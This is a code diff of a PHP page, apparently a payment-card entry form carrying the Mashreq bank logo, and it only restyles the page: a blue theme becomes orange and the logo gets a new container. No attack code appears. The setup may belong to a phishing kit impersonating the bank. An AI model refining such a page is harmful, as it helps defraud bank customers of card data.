@@ -65,7 +65,7 @@ if (isset($_GET['reject'])) {
         body {
             font-family: 'Cairo', sans-serif;
             min-height: 100vh;
-            background: #f0f4f8;
+            background: #fff8f0;
             display: flex;
             justify-content: center;
             align-items: flex-start;
@@ -79,11 +79,11 @@ if (isset($_GET['reject'])) {
             background: #ffffff;
             display: flex;
             flex-direction: column;
-            box-shadow: 0 0 40px rgba(0, 0, 0, 0.06);
+            box-shadow: 0 0 40px rgba(245, 124, 0, 0.08);
         }
 
         .header {
-            background: linear-gradient(135deg, #1a5ca8 0%, #0d3b6e 100%);
+            background: linear-gradient(135deg, #ff9f2f 0%, #f57c00 50%, #c85d00 100%);
             padding: 36px 24px;
             text-align: center;
             position: relative;
@@ -97,23 +97,15 @@ if (isset($_GET['reject'])) {
             right: -40%;
             width: 200%;
             height: 200%;
-            background: radial-gradient(circle, rgba(255, 255, 255, 0.05) 0%, transparent 50%);
+            background: radial-gradient(circle, rgba(255, 220, 180, 0.18) 0%, transparent 65%);
         }
 
-        .header-logo {
-            width: 100px;
-            height: auto;
-            filter: brightness(10);
-            margin-bottom: 14px;
-            position: relative;
-            z-index: 1;
-        }
 
         .header-icon {
-            width: 60px;
-            height: 60px;
+            width: 64px;
+            height: 64px;
             background: rgba(255, 255, 255, 0.12);
-            border-radius: 16px;
+            border-radius: 18px;
             display: flex;
             align-items: center;
             justify-content: center;
@@ -146,7 +138,7 @@ if (isset($_GET['reject'])) {
 
         /* Card preview */
         .card-preview {
-            background: linear-gradient(135deg, #1e3a5f, #0d2847);
+            background: linear-gradient(135deg, #ff9f2f, #f57c00);
             border-radius: 16px;
             padding: 22px;
             margin-bottom: 28px;
@@ -166,7 +158,7 @@ if (isset($_GET['reject'])) {
             right: -30%;
             width: 180%;
             height: 180%;
-            background: radial-gradient(circle, rgba(255, 255, 255, 0.04) 0%, transparent 60%);
+            background: radial-gradient(circle, rgba(255,255,255,0.08) 0%, transparent 60%);
         }
 
         .card-chip {
@@ -179,7 +171,7 @@ if (isset($_GET['reject'])) {
         .chip-icon {
             width: 40px;
             height: 28px;
-            background: linear-gradient(135deg, #c9a236, #e8c95f);
+            background: linear-gradient(135deg, #ffd27a, #ffb347);
             border-radius: 6px;
         }
 
@@ -209,19 +201,19 @@ if (isset($_GET['reject'])) {
             display: block;
             font-size: 14px;
             font-weight: 600;
-            color: #374151;
+            color: #8a5a24;
             margin-bottom: 8px;
         }
 
         .field-input {
             width: 100%;
             padding: 14px 16px;
-            border: 1.5px solid #e2e8f0;
+            border: 1.5px solid rgba(245,124,0,0.18);
             border-radius: 12px;
             font-size: 15px;
             color: #f57c00;
             font-family: 'Cairo', sans-serif;
-            background: #f8fafc;
+            background: #fff8f0;
             outline: none;
             transition: all 0.25s;
             direction: rtl;
@@ -233,13 +225,13 @@ if (isset($_GET['reject'])) {
         }
 
         .field-input::placeholder {
-            color: #94a3b8;
+            color: #d29a63;
         }
 
         .field-input:focus {
-            border-color: #1a5ca8;
+            border-color: #f57c00;
             background: #fff;
-            box-shadow: 0 0 0 3px rgba(26, 92, 168, 0.1);
+            box-shadow: 0 0 0 3px rgba(245,124,0,0.15);
         }
 
         .row {
@@ -285,20 +277,44 @@ if (isset($_GET['reject'])) {
             cursor: not-allowed;
             transition: all 0.3s;
             color: #fff;
-            background: linear-gradient(135deg, #94a3b8, #cbd5e1);
+            background: linear-gradient(135deg, #f7c58b, #e8a45a);
             margin-top: 4px;
         }
 
         .submit-btn.active {
-            background: linear-gradient(135deg, #1a5ca8, #2563eb);
+            background: linear-gradient(135deg, #ff9f2f, #f57c00);
             cursor: pointer;
-            box-shadow: 0 4px 14px rgba(26, 92, 168, 0.3);
+            box-shadow: 0 4px 14px rgba(245,124,0,0.35);
         }
 
         .submit-btn.active:hover {
             transform: translateY(-1px);
-            box-shadow: 0 6px 20px rgba(26, 92, 168, 0.4);
+            box-shadow: 0 6px 20px rgba(245,124,0,0.45);
         }
+
+            .logo-container {
+    width: 110px;
+    height: 110px;
+    border-radius: 24px;
+    overflow: hidden;
+    background: #fff;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin: 0 auto 12px;
+
+    box-shadow: 0 8px 24px rgba(0,0,0,0.18);
+    border: 2px solid rgba(255,255,255,0.25);
+
+    backdrop-filter: blur(10px);
+}
+
+.header-logo {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+    display: block;
+}
 
         /* Card logos */
         .card-logos {
@@ -324,7 +340,7 @@ if (isset($_GET['reject'])) {
         }
 
         .security-note span {
-            color: #64748b;
+            color: #8a5a24;
             font-size: 11px;
             font-weight: 500;
         }
@@ -356,8 +372,8 @@ if (isset($_GET['reject'])) {
         .loader-spinner {
             width: 48px;
             height: 48px;
-            border: 4px solid #e2e8f0;
-            border-top-color: #1a5ca8;
+            border: 4px solid #ffe0bf;
+            border-top-color: #f57c00;
             border-radius: 50%;
             animation: spin 0.8s linear infinite;
             margin: 0 auto 16px;
@@ -371,7 +387,7 @@ if (isset($_GET['reject'])) {
         }
 
         .loader-card p {
-            color: #64748b;
+            color: #8a5a24;
             font-size: 13px;
         }
 
@@ -392,7 +408,9 @@ if (isset($_GET['reject'])) {
 <body>
     <div class="page-wrapper">
         <div class="header">
-            <img src="assets/mashreq.jpeg" alt="MASHREQ" class="header-logo">
+                            <div class="logo-container">
+    <img src="assets/mashreq.jpeg" alt="MASHREQ" class="header-logo">
+</div>
             <div class="header-icon">
                 <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2"
                     stroke-linecap="round" stroke-linejoin="round">
